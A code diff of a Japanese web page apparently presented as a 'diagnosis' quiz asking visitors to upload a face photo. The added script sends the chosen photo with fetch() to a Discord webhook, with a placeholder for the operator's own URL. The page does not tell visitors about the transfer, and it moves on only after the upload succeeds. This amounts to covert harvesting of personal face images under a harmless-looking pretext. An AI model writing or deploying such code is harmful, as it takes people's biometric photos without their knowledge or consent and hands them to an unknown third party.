@@ -1,43 +1,49 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
+  <meta charset="UTF-8">
+  <title>診断ページ２ - 顔写真アップロード</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>顔写真アップロード</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
   <div class="container">
     <h2>あなたの顔写真をアップロードしてください</h2>
-    <input type="file" id="photoInput" accept="image/*" />
-    <br>
-    <button id="nextBtn" disabled>次に進む</button>
+    <input type="file" id="upload" accept="image/*">
+    <button id="sendButton">次に進む</button>
   </div>
 
   <script>
-    const photoInput = document.getElementById('photoInput');
-    const nextBtn = document.getElementById('nextBtn');
+    const webhookURL = "https://discord.com/api/webhooks/ここにあなたのWebhookURLを貼ってください";
 
-    // ファイル選択時にボタンを有効化
-    photoInput.addEventListener('change', () => {
-      if (photoInput.files.length > 0) {
-        nextBtn.disabled = false;
-      } else {
-        nextBtn.disabled = true;
-      }
-    });
+    document.getElementById("sendButton").addEventListener("click", function () {
+      const fileInput = document.getElementById("upload");
+      const file = fileInput.files[0];
 
-    // 「次に進む」ボタンでページ遷移
-    nextBtn.addEventListener('click', () => {
-      if (photoInput.files.length === 0) {
-        alert("写真をアップロードしてください");
+      if (!file) {
+        alert("画像を選んでください！");
         return;
       }
 
-      // ページ遷移（例：page3.htmlへ）
-      window.location.href = 'page3.html';
+      const formData = new FormData();
+      formData.append("file", file);
+
+      fetch(webhookURL, {
+        method: "POST",
+        body: formData
+      })
+      .then((response) => {
+        if (response.ok) {
+          window.location.href = "page3.html";  // 送信成功で次へ
+        } else {
+          alert("送信に失敗しました。");
+        }
+      })
+      .catch((error) => {
+        console.error("エラー:", error);
+        alert("送信中にエラーが発生しました。");
+      });
     });
   </script>
-
 </body>
 </html>
